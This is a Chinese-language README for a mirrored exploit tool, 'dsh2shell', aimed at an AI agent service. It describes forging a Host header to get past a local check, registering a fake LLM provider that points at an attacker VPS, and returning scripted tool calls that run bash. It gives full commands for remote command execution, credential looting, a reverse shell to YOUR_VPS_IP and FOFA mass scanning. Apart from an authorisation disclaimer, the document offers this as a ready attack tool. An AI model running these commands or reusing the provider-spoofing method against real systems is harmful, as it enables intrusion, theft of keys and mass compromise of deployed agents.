# dsh2shell - 社区高级 PoC

> 来源：https://github.com/ChaoMixian/dsh2shell  
> 作者：ChaoMixian  
> 本文件夹包含该工具的镜像副本，仅供学习和研究参考

## 说明

`dsh2shell` 是社区开发的完整 PoC 工具，使用**假 LLM 模型服务器**技术实现确定性命令执行。

### 技术方案对比

| 特性 | dsh2shell | dsh_exploit_v2.py（本仓库） |
|---|---|---|
| 技术方案 | 假 LLM 模型服务器 | 直接调用 session.prompt |
| 命令执行 | 确定性（不依赖真实模型） | 依赖目标的真实 LLM（异步） |
| 所需资源 | 攻击者 VPS（目标需能访问） | 仅需 HTTP 客户端 |
| 功能完整性 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| 复杂度 | 高（内置 HTTP 服务器） | 低（单文件标准库） |

### dsh2shell 的核心技术

1. **伪造 Host 头** - 绕过本地检查
2. **注册假 LLM 提供商** - 调用 `llm.registerProvider` 注册指向攻击者 VPS 的模型
3. **内置假模型服务器** - 运行 HTTP 服务器模拟 OpenAI API
4. **确定性 tool calls** - 返回预定的 bash 命令执行指令
5. **完整交互** - 支持反弹 Shell、凭证窃取、FOFA 批量扫描

### 为什么有两个 PoC？

**dsh2shell（本文件夹）** - 适合：
- ✅ 需要稳定的命令执行（不依赖真实模型响应）
- ✅ 有自己的 VPS（目标能访问）
- ✅ 需要交互式 Shell
- ✅ 需要批量扫描和凭证窃取

**dsh_exploit_v2.py（本仓库根目录）** - 适合：
- ✅ 快速验证漏洞存在性
- ✅ 目标环境已有真实 LLM 配置
- ✅ 简单场景（不需要完整功能）
- ✅ 学习攻击原理（代码更简单）

## 使用方法

### 基础命令执行

```bash
# 需要一个目标能访问的公网地址（如你的 VPS）
python3 dsh2shell.py -t http://target:3000 \
    --public-base http://YOUR_VPS_IP:9999/v1 \
    --cmd "id" --cmd "whoami"
```

### 凭证窃取

```bash
python3 dsh2shell.py -t http://target:3000 \
    --public-base http://YOUR_VPS_IP:9999/v1 \
    --loot-keys
```

### 交互式 Shell

```bash
python3 dsh2shell.py -t http://target:3000 \
    --public-base http://YOUR_VPS_IP:9999/v1 \
    --shell --lhost YOUR_VPS_IP --raw
```

### 只读探测

```bash
python3 dsh2shell.py -t http://target:3000 --dry-run
```

### FOFA 批量扫描

```bash
export FOFA_KEY='YOUR_FOFA_API_KEY'
python3 dsh2shell.py --fofa
```

## 详细文档

请查看本文件夹中的 `README.md` 以获取完整文档。

## 重要提示

⚠️ **本工具仅供授权安全测试、漏洞研究和防御性验证使用。**

未经授权访问计算机系统是违法行为。使用者需确保已获得明确授权。

## 参考

- **原始仓库**: https://github.com/ChaoMixian/dsh2shell
- **漏洞详情**: GitHub Discussion #853
- **本仓库的简化版本**: `../dsh_exploit_v2.py`
